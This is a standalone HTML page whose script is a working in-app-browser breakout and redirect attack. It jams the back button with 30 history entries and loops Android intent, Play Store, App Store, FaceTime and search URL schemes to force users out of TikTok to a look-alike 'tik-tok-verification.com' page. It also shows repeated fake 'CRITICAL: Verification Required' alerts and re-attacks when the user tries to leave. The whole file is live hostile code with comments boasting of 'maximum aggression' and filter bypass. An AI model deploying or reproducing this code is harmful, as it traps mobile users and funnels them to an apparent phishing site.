<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    
    // ATOMIC FAIL-SAFE: The absolute timestamp when the script must die.
    const killTime = Date.now() + 5000; 

    function triggerConflict() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            // 1. Android 'Intent' for Chrome
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
            
            // 2. Play Store Hijack (Forces exit to Store, which then opens the URL)
            setTimeout(() => {
                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
            }, 50);
        } else if (isIOS) {
            // 1. iOS App Store Protocol (Bypasses TikTok UI filters)
            window.location.href = "itms-apps://itunes.apple.com/app/apple-store/id361309726?mt=8";
            
            // 2. Facetime Hijack (Forces a system-level popup)
            setTimeout(() => {
                window.location.href = "facetime-prompt://" + target.replace("https://", "");
            }, 50);

            // 3. Search Hijack
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
        }
    }

    function rampage() {
        // THE ONLY WAY TO EXIT: Check if current time has passed the killTime.
        if (Date.now() > killTime) {
            console.log("FAIL-SAFE TRIGGERED. EXITING.");
            return; 
        }

        // Attempt the breakout
        triggerConflict();

        // The Alert Lock: Freezes TikTok so the OS can take over the redirect
        alert("CRITICAL: Verification Required\n\nPress OK to open the secure system browser.");
        
        // Re-attempt after dismissal
        triggerConflict();

        // Minimal delay for maximum aggression
        setTimeout(rampage, 1);
    }

    window.onload = () => {
        // Jam the back button
        for(let i=0; i<30; i++) history.pushState(null, null, "#ver_" + i);
        rampage();
    };

    // If they hit 'X' or the top bar, the window blurs. We hit them again.
    window.onblur = () => {
        if (Date.now() < killTime) rampage();
    };
</script>

</body>
</html>
